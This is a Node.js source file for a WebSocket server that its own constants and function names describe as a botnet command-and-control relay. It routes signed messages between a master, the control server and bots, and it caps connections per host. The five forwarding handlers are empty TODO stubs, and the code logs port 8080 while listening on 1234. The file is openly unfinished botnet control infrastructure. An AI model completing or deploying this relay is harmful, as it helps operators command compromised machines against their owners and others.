//#region [ IMPORTS ]

const WebSockets = require('websocket');
const http = require('http');

//#endregion

const server = http.createServer((req, res) => { res.writeHead(403).end(); });

server.listen(1234, function () {
  console.log((new Date()) + ' Server is listening on port 8080');
});

const WebSockServer = new WebSockets.server({
  httpServer: server,
  maxReceivedFrameSize: 65536,
  maxReceivedMessageSize: 65536
});

//#region [ CONSTANTS ]

const MaxSingleHostsConnections = 1;
const BotnetCommandControls = [
  '\x23\x1a\x20\x17', //Master -> Command Control         [  Unicast  ]
  '\x27\x1c\x24\x19', //Command Control -> Bot            [  Unicast  ]
  '\xff\x1c\xfe\x1b', //Bot -> Command Control            [  Unicast  ]
  '\x9b\x1c\x66\x19', //Command Control -> Master         [  Unicast  ]
  '\x9b\x9b\x9d\xff'  //Master -> Command Control -> All  [ Broadcast ]
];

var OpennedSockets    = 0;
var MaxOpennedSockets = 16;
var SocketTable       = [];

//#endregion

//#region [ UTILITY FUNCTIONS ]

function IsAllowedOrigin(origin) {
  return true;
}

function SignatureCheck(m) {
  if (m.length < 4)
    return false;
  let s1 = m.charCodeAt(0);
  let s2 = m.charCodeAt(1);
  let e1 = m.charCodeAt(m.length-2);
  let e2 = m.charCodeAt(m.length-1);
  return (s1 % (e1 + 1) == s2 % (e2 + 1));
}

//#endregion

//#region [ EVENT LISTENERS ]

function FwdMasterToCommandControlEvt(payload){
  //TODO
}

function FwdCommandControlToBotEvt(payload){
  //TODO
}

function FwdBotToCommandControlEvt(payload){
  //TODO
}

function FwdCommandControlToMasterEvt(payload){
  //TODO
}

function FwdMasterToCommandControlToAllEvt(payload){
  //TODO
}

//#endregion

//#region [ PACKET ROUTER ]

function OnPacketReceived(m){
  let msig = [
    m[0], m[1],
    m[m.length-2],
    m[m.length-1]
  ];
  let payload = m.substr(2).substr(0, m.length-4);
  try{ payload = JSON.parse(payload); } catch(e){ return false; }
  msig = msig.join('');
  if (msig == BotnetCommandControls[0]){
    FwdMasterToCommandControlEvt(payload);
  } else 
  if (msig == BotnetCommandControls[1]) {
    FwdCommandControlToBotEvt(payload);
  } else 
  if (msig == BotnetCommandControls[2]) {
    FwdBotToCommandControlEvt(payload);
  } else 
  if (msig == BotnetCommandControls[3]) {
    FwdCommandControlToMasterEvt(payload);
  } else 
  if (msig == BotnetCommandControls[4]) {
    FwdMasterToCommandControlToAllEvt(payload);
  } else {
    return false;
  }
  return true;
}

//#endregion

WebSockServer.on('connect', (connection) => {
  OpennedSockets++;
  connection.on('message', (message) => {
    if (message.type == 'utf8'){
      let buffer = message.utf8Data;
      if (!SignatureCheck(buffer))
        connection.drop(403, 'Invalid signature provided');
      if (!OnPacketReceived(buffer))
        connection.drop(403, 'Cannot parse the payload data');
    } else {
      connection.drop(403, 'Invalid buffer received');
    }
  });
});

WebSockServer.on('request', (request) => {
  (IsAllowedOrigin(request.origin) ? () => { 
    if (OpennedSockets == MaxOpennedSockets){
      request.reject(503, 'Maximum concurrent socket connections limit hit');
    } 
    else {
      let NumOfConnections = 0;
      for (let scki = 0; scki < SocketTable.length; scki++){
        if ((SocketTable[scki].connected == true) && (SocketTable[scki].remoteAddress == request.remoteAddress)){
          NumOfConnections++;
        }
      }
      if (NumOfConnections < MaxSingleHostsConnections){
        SocketTable.push(request.accept());
      } else {
        request.reject(403, 'Maximum concurrent single hosts connections limit hit'); 
      }
    }
  } : () => { 
    request.reject(403, 'Access Denied'); 
  })();
});

WebSockServer.on('close', (connection, reasonCode, desc) => {
  SocketTable = SocketTable.filter((sock, _idx, _socktable) => {
    return !((sock.remoteAddress == connection.remoteAddress) || (sock == connection));
  });
  if (OpennedSockets > 0)
    OpennedSockets--;
});